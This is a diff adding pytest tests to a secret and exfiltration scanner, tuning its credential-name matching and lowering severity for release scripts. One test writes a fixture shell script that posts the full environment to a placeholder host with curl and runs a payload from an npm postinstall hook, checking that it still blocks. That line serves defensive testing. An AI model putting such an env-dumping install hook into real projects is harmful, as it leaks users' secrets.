@@ -1122,3 +1122,270 @@ class TestAnExampleOfAnAttackIsNotAnAttack:
         result = Scanner(Config.default().with_overrides(use_cache=False)).scan(tmp_path)
         bidi = [f for f in result.findings if f.rule_id == "SUSPECT.OBFUSCATION.BIDI.001"]
         assert bidi and any(f.severity >= Severity.HIGH for f in bidi)
+
+
+class TestTokenMeansTwoThings:
+    """Measured across 338 of the most-starred repositories on GitHub,
+    `SECRET.GENERIC.ASSIGNMENT.001` fired at blocking severity in 42% of them. No
+    plausible world has four in ten of the best-read codebases on the internet
+    leaking credentials.
+
+    The largest single cause was one English word with two unrelated meanings. The
+    credential keyword was allowed to run into anything that followed it, which made
+    it a PREFIX test: `tokenizer` was reported as a credential, and so were
+    `maxTokens`, `promptTokens`, `completionTokens` and `max_new_tokens` -- counts in
+    every codebase that talks to a language model -- and `tokens`, which is usually a
+    lexer's output.
+
+    The keyword now has to be a whole word: a suffix is accepted only when it starts
+    the way a new word starts, with a separator or a capital.
+    """
+
+    VALUE = ("aB3kQ9mZ", "2xT7vL4nR8wY")
+
+    def fires(self, name: str) -> bool:
+        return ASSIGNMENT.search(f'{name} = "{assemble(*self.VALUE)}"'.encode()) is not None
+
+    @pytest.mark.parametrize(
+        "name",
+        [
+            "tokenizer",
+            "maxTokens",
+            "promptTokens",
+            "completionTokens",
+            "max_new_tokens",
+            "tokens",
+            "JoinTokens",
+            "secretsmanager",
+        ],
+    )
+    def test_a_different_word_is_not_a_credential(self, name: str) -> None:
+        assert not self.fires(name)
+
+    @pytest.mark.parametrize(
+        "name",
+        [
+            "GITHUB_TOKEN",
+            "api_key",
+            "privateKey",
+            "accessToken",
+            "SECRET_KEY_BASE",
+            "access_token_value",
+            "accessTokenValue",
+            "password",
+            "client_secret",
+            "AUTH_TOKEN",
+        ],
+    )
+    def test_a_credential_name_still_fires(self, name: str) -> None:
+        assert self.fires(name)
+
+    def test_passphrase_was_added_while_narrowing(self) -> None:
+        """`pass` followed by lowercase letters is now refused, which would have lost
+        `passphrase` -- a real credential name -- so it is named in the keyword list
+        rather than left to the prefix behaviour that used to cover it."""
+        assert self.fires("passphrase")
+
+
+class TestANameSaysWhatItHolds:
+    """Three more shapes behind the same rule, all of them names that describe a
+    credential rather than being one.
+
+    `AntiforgeryTokenFieldName` in ASP.NET Core, `awsContainerAuthorizationTokenEnv`
+    in the AWS SDK and `SpiffeJwtNormalizedTokenUnits` in Vault were all reported.
+    Every one ends in a word already on the configuration list, and every one spells
+    its compound in CamelCase, which the split could not see.
+
+    `vaultPathTokenCreate` and eight siblings hold API routes like
+    "auth/token/create". Those end in `create`, and the word that matters is in the
+    middle -- so location words are checked anywhere in the name, which a suffix test
+    cannot do.
+    """
+
+    @pytest.mark.parametrize(
+        "name",
+        [
+            "AntiforgeryTokenFieldName",
+            "awsContainerAuthorizationTokenEnv",
+            "SpiffeJwtNormalizedTokenUnits",
+            "credentialType",
+            "CredentialScope",
+            "SecretEngineCounts",
+            "Auth_VerifyTokenAuthority_FullMethodName",
+        ],
+    )
+    def test_camel_case_is_split(self, name: str) -> None:
+        assert names_configuration(name)
+
+    @pytest.mark.parametrize(
+        "name",
+        [
+            "vaultPathTokenCreate",
+            "vaultPathTokenRevokeSelf",
+            "vaultPathTokenLookup",
+            "TOKEN_URL_OVERRIDE",
+            "secret_endpoint_template",
+        ],
+    )
+    def test_a_location_word_anywhere_is_enough(self, name: str) -> None:
+        assert names_configuration(name)
+
+    @pytest.mark.parametrize(
+        "name", ["SECRET_KEY", "api_key", "DEMO_PASSWORD", "privateKey", "TOTPSecret"]
+    )
+    def test_a_credential_name_is_untouched(self, name: str) -> None:
+        assert not names_configuration(name)
+
+
+class TestWhereTheRestOfTheWorldKeepsItsFixtures:
+    """Vault had twenty-one private keys reported at CRITICAL under
+    `api/test-fixtures/keys/`, `command/agent/test-fixtures/reload/` and six more
+    directories -- every one a certificate generated for a TLS reload test.
+
+    `fixtures/` was on the list. `test-fixtures/`, with the hyphen, was not.
+
+    The same run turned up `ui/mirage/factories/` (Mirage exists to produce
+    plausible-looking data, so a generated password is the point of the file) and
+    `integtest/`, which is an integration-test directory that does not spell it
+    "integration".
+    """
+
+    @pytest.mark.parametrize(
+        "path",
+        [
+            "api/test-fixtures/keys/key.pem",
+            "command/agent/test-fixtures/reload/reload_bar.key",
+            "internal/testdata/cert.pem",
+            "command/agent/testing.go",
+            "pkg/testutil/helpers.go",
+            "ui/mirage/factories/ldap-credential.js",
+            "spec/factories/users.rb",
+            "command/auth/kerberos/integtest/integrationtest.sh",
+            "tls/testcerts/server.key",
+        ],
+    )
+    def test_it_is_recognised(self, path: str) -> None:
+        from cordon_scanner.detect.secrets import is_test_material
+
+        assert is_test_material(path)
+
+    @pytest.mark.parametrize(
+        "path", ["vault/login_mfa.go", "src/auth/session.ts", "lib/credentials.rb"]
+    )
+    def test_application_code_is_not(self, path: str) -> None:
+        from cordon_scanner.detect.secrets import is_test_material
+
+        assert not is_test_material(path)
+
+
+class TestPublishingIsNotExfiltration:
+    """`SUSPECT.EXFIL.001`, `SUSPECT.DROPPER.001` and `SUSPECT.ANTI_ANALYSIS.001` each
+    fired in a fifth to a third of all repositories measured, and for all three
+    roughly HALF the findings were in the project's own build and release tooling:
+    `scripts/dist.sh`, `packaging/utils/coverity-scan.sh`,
+    `.buildkite/scripts/dra-workflow.trigger.sh`, `setup.py`.
+
+    Each of those reads a token from the environment, calls an API and runs a
+    command. That is credential plus egress plus spawn, which is the composite. It is
+    also what publishing a release IS. The composite's own source already named this
+    shape as the problem -- "a deploy script that pushes and posts to Slack" is in the
+    comment explaining why a third signal was added -- and it was still firing on
+    exactly that.
+
+    A ceiling, with three things keeping it from being a hole: MALICIOUS is never
+    ceilinged, the install-hook escalation is applied afterwards so anything running
+    unprompted still reaches CRITICAL, and a script here runs when somebody runs it,
+    which is not the threat the composites are calibrated for.
+    """
+
+    @pytest.mark.parametrize(
+        "path",
+        [
+            "scripts/dist.sh",
+            "packaging/utils/coverity-scan.sh",
+            ".buildkite/scripts/dra-workflow.trigger.sh",
+            ".github/actions/pr_diff/script.sh",
+            "setup.py",
+            "Makefile",
+            "dev/breeze/src/airflow_breeze/utils/run_utils.py",
+            "hack/verify-gofmt.sh",
+            "tools/release/publish.js",
+        ],
+    )
+    def test_build_tooling_is_recognised(self, path: str) -> None:
+        from cordon_scanner.detect.secrets import is_build_tooling
+
+        assert is_build_tooling(path)
+
+    @pytest.mark.parametrize(
+        "path",
+        [
+            "web/public/pdf.worker.min.mjs",
+            ".yarn/releases/yarn-4.17.1.cjs",
+            ".github/actions/needs-triage/dist/index.js",
+            "session/auth/auth_grpc.pb.go",
+            "proto/service_pb2.py",
+        ],
+    )
+    def test_generated_output_is_recognised(self, path: str) -> None:
+        from cordon_scanner.detect.secrets import is_generated_artefact
+
+        assert is_generated_artefact(path)
+
+    @pytest.mark.parametrize(
+        "path",
+        [
+            # Somebody else's SOURCE, deliberately not ceilinged: that is exactly
+            # where a supply-chain payload lives, and blunting the rules there would
+            # blunt them where they matter most.
+            "vendor/github.com/moby/buildkit/session/auth.go",
+            "node_modules/left-pad/index.js",
+            "src/app/main.py",
+        ],
+    )
+    def test_vendored_source_and_application_code_are_not(self, path: str) -> None:
+        from cordon_scanner.detect.secrets import is_build_tooling, is_generated_artefact
+
+        assert not is_build_tooling(path)
+        assert not is_generated_artefact(path)
+
+    def test_a_release_script_is_reported_below_blocking(self, tmp_path) -> None:
+        from cordon_scanner import Scanner
+        from cordon_scanner.core.config import Config
+        from cordon_scanner.core.models import Severity
+
+        scripts = tmp_path / "scripts"
+        scripts.mkdir()
+        (scripts / "dist.sh").write_text(
+            "#!/bin/sh\n"
+            'TOKEN="$GITHUB_TOKEN"\n'
+            'curl -H "Authorization: $TOKEN" -d @dist.tgz https://uploads.example.test/r\n'
+            "tar czf dist.tgz ./build\n",
+            encoding="utf-8",
+        )
+        result = Scanner(Config.default().with_overrides(use_cache=False)).scan(tmp_path)
+        exfil = [f for f in result.findings if f.rule_id.startswith("SUSPECT.EXFIL")]
+        assert all(f.severity <= Severity.MEDIUM for f in exfil)
+
+    def test_the_same_script_run_at_install_time_still_blocks(self, tmp_path) -> None:
+        """The ordering that keeps the ceiling safe: the install-hook escalation is
+        applied after it, so code that runs unprompted is unaffected."""
+        from cordon_scanner import Scanner
+        from cordon_scanner.core.config import Config
+        from cordon_scanner.core.models import Severity
+
+        scripts = tmp_path / "scripts"
+        scripts.mkdir()
+        (scripts / "dist.sh").write_text(
+            '#!/bin/sh\ncurl -d "$(env)" https://collector.example.invalid/r\nsh ./payload\n',
+            encoding="utf-8",
+        )
+        (tmp_path / "package.json").write_text(
+            '{"name":"x","version":"1.0.0","scripts":{"postinstall":"sh scripts/dist.sh"}}\n',
+            encoding="utf-8",
+        )
+        result = Scanner(Config.default().with_overrides(use_cache=False)).scan(tmp_path)
+        hits = [f for f in result.findings if f.location.path.endswith("scripts/dist.sh")]
+        assert any(f.severity >= Severity.HIGH for f in hits), [
+            (f.rule_id, str(f.severity)) for f in hits
+        ]
